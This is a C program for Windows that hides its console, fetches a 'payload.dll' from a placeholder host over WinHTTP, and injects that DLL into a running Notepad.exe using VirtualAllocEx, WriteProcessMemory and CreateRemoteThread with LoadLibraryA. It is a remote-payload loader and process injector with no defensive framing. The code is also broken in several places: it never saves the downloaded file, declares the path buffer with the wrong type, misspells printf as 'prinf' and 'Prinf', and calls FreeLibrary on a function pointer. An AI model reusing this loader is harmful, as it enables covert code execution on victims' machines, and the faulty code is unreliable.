#include<windows.h>
#include<stdio.h>
#include<tlhelp32.h>
#include<winhttp.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

void download_dll(void){
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    
    //download dll
    hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    //change the URL to the server hosting the DLL
    hConnect = WinHttpConnect(hSession, L"www.example.com", 80, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        printf("[-] WinHttpConnect failed: %d\n", GetLastError());
        return;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/payload.dll", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest){
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        printf("[-] WinHttpOpenRequest failed: %d\n", GetLastError());
        return;
    }
    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!WinHttpReceiveResponse(hRequest, NULL)){
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        printf("[-] WinHttpReceiveResponse failed: %d\n", GetLastError());
        return;
    }
    WinHttpReceiveResponse(hRequest, NULL);
    if (!WinHttpReceiveResponse(hRequest, NULL)){
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        printf("[-] WinHttpReceiveResponse failed: %d\n", GetLastError());
        return;
    }
}

DWORD find_pid(const char* process_name){
    while(1){
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if ( snapshot == INVALID_HANDLE_VALUE){
            return 0;
        }
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (!Process32First(snapshot, &pe)){
            CloseHandle(snapshot);
            return 0;
        }

        do {
            if ( strcmp(pe.szExeFile, process_name) == 0){
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while ( Process32Next(snapshot, &pe));
        CloseHandle(snapshot);
        Sleep(1000);
    }
}

int main(void){
    char* user_profile = getenv("USERPROFILE");
    char* download_path[MAX_PATH];
    if ( user_profile != NULL){
        snprintf(download_path, sizeof(download_path), "%s\\payload.dll", user_profile);
        download_dll();
    }
    HANDLE open = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        find_pid("Notepad.exe")
    );

    if ( open == NULL){
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        CloseHandle(open);
        return EXIT_FAILURE;
    }

    LPVOID addr = VirtualAllocEx(
        open,
        NULL,
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if ( addr == NULL){
        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
        CloseHandle(open);  
        return EXIT_FAILURE;
    }

    BOOL write = WriteProcessMemory(
        open,
        addr,
        download_path,
        strlen(download_path) + 1,
        NULL
    );
    if ( write == FALSE){
        printf("[-] WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(open, addr, 0, MEM_RELEASE);
        CloseHandle(open);
        return EXIT_FAILURE;
    }

    FARPROC loadlib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if ( loadlib == NULL){
        printf("[-] GetProcAddress failed: %d\n", GetLastError());
        VirtualFreeEx(open, addr, 0, MEM_RELEASE);
        CloseHandle(open);
        return EXIT_FAILURE;
    }

    HANDLE thread = CreateRemoteThread(
        open,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)loadlib,
        addr,
        0,
        NULL
    );
    if ( thread == NULL){
        printf("[-] CreateRemoteThread failed: %d\n", GetLastError());
        VirtualFreeEx(open, addr, 0, MEM_RELEASE);
        CloseHandle(open);
        return EXIT_FAILURE;
    }

    prinf("[+] CreateRemoteThread success: %p\n", thread);
    Prinf("[+] LoadLibraryA address: %p\n", loadlib);
    WaitForSingleObject(thread, 0xFFFFFFFF);
    FreeLibrary(loadlib);
    CloseHandle(thread);
    VirtualFreeEx(open, addr, 0, MEM_RELEASE);
    CloseHandle(open);
    return EXIT_SUCCESS;
}